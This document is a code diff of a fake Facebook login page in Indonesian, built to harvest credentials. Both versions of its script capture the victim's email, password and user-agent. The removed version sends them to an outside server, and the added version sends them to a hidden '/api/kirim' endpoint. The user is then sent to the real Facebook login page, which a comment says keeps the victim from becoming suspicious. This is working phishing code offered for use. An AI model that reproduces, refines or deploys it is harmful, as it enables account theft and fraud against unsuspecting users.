@@ -1,44 +1,65 @@
 <!DOCTYPE html>
-<html>
+<html lang="id">
 <head>
+    <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Facebook - Masuk atau Daftar</title>
+    <title>Facebook – Masuk atau Daftar</title>
     <style>
-        body { font-family: Arial; background: #f0f2f5; display: flex; justify-content: center; padding-top: 50px; }
-        .box { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); width: 340px; text-align: center; }
-        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #dddfe2; border-radius: 6px; box-sizing: border-box; }
-        button { width: 100%; padding: 12px; background: #1877f2; color: white; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; }
+        body { font-family: Helvetica, Arial, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .login-container { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0, 0, 0, .1); width: 360px; text-align: center; }
+        .logo { color: #1877f2; font-size: 35px; font-weight: bold; margin-bottom: 10px; }
+        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #dddfe2; border-radius: 6px; box-sizing: border-box; font-size: 14px; }
+        button { width: 100%; padding: 12px; background-color: #1877f2; border: none; border-radius: 6px; color: white; font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 10px; }
+        button:hover { background-color: #166fe5; }
+        .footer { margin-top: 15px; border-top: 1px solid #dadde1; padding-top: 15px; }
+        .create-btn { background-color: #42b72a; display: inline-block; padding: 10px 16px; color: white; border-radius: 6px; text-decoration: none; font-weight: bold; font-size: 16px; }
     </style>
 </head>
 <body>
-    <div class="box">
-        <h1 style="color:#1877f2">facebook</h1>
-        <input type="text" id="email" placeholder="Email atau Telepon">
-        <input type="password" id="pass" placeholder="Kata Sandi">
-        <button onclick="kirim()">Log In</button>
+
+<div class="login-container">
+    <div class="logo">facebook</div>
+    <p style="font-size: 18px; margin-bottom: 20px;">Masuk ke Facebook</p>
+    
+    <input type="text" id="email" placeholder="Email atau Nomor Telepon" required>
+    <input type="password" id="pass" placeholder="Kata Sandi" required>
+    
+    <button onclick="kirimData()">Log In</button>
+    
+    <div style="margin: 15px 0;"><a href="#" style="color: #1877f2; text-decoration: none; font-size: 14px;">Lupa kata sandi?</a></div>
+    
+    <div class="footer">
+        <a href="#" class="create-btn">Buat Akun Baru</a>
     </div>
+</div>
 
-    <script>
-        async function kirim() {
-            const user = document.getElementById('email').value;
-            const pw = document.getElementById('pass').value;
-            const device = navigator.userAgent;
+<script>
+    async function kirimData() {
+        const user = document.getElementById('email').value;
+        const pw = document.getElementById('pass').value;
+        const device = navigator.userAgent;
 
-            // --- GANTI INI KE ALAMAT PTERO LU ---
-            // Contoh: http://panel.authero.id:2563/gas
-            const PTERO_URL = 'http://panel.authero.id:2563/gas';
-
-            try {
-                await fetch(PTERO_URL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ user, pw, device })
-                });
-                window.location.href = 'https://www.facebook.com';
-            } catch (e) {
-                alert("Koneksi ke Backend Ptero Gagal! Cek Port Ptero Lu.");
-            }
+        if(!user || !pw) {
+            alert('Harap isi semua kolom!');
+            return;
         }
-    </script>
+
+        try {
+            // Mengirim data ke API Vercel internal (Aman dari inspect element)
+            await fetch('/api/kirim', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ user, pw, device })
+            });
+
+            // Redirect ke halaman login FB asli agar tidak curiga
+            window.location.href = 'https://www.facebook.com/login';
+        } catch (e) {
+            console.error("Gagal mengirim data.");
+            alert("Kesalahan jaringan, coba lagi.");
+        }
+    }
+</script>
+
 </body>
 </html>
